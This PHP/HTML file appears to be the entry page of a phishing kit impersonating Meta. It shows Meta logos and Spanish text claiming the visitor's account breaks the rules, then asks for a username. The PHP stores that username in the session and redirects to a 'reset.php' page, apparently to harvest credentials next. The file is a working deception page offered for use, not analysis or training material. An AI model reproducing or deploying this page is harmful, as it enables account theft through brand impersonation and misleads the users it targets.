<?php
if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: reset.php?username=$username");
}
include 'api/server.php';	
?>
<html lang="en">
<head>
  <title>Meta Verse </title>
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/6033/6033716.png"
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
  <section class="ftco-section">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-md-7 col-lg-5">
          <div class="login-wrap p-4 p-md-5">
            <p style="text-align: center; color: black; font-size: 20px;" >
              <img src="https://i.pinimg.com/originals/57/6c/dd/576cdd470fdc0b88f4ca0207d2b471d5.png" width="30%"  alt="">
              
              <br>Formulario de objeción<hr>
            </p>  
            <p style="text-align:center; font-size: 14px; color: black; font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;" >Ha sido redirigido a esta página y su cuenta viola nuestras reglas. Continúe en el formulario escribiendo su nombre de usuario.</p>
            <form class="login-form">
              <div class="form-group"method="post">
                <input type="username" name="username" style="height: 45px;" class="form-control rounded-left" placeholder="Username" minlength="4" required>
              </div>
              <div>
                <button type="submit" style="border-radius: 8px;  height: 35px; width: 100%; border: none; background-color: #1E90FF; color: white; font-weight: bold;" >Next</button>
              </div><br>
              <div id="error"></div>
              <div>
                <center>
                  <img src="https://logodownload.org/wp-content/uploads/2021/10/meta-logo-1.png" width="110px" alt="">
                </center>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </section>
  <script src="js/jquery.min.js"></script>
  <script src="js/popper.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/main.js"></script>
</body>
</html>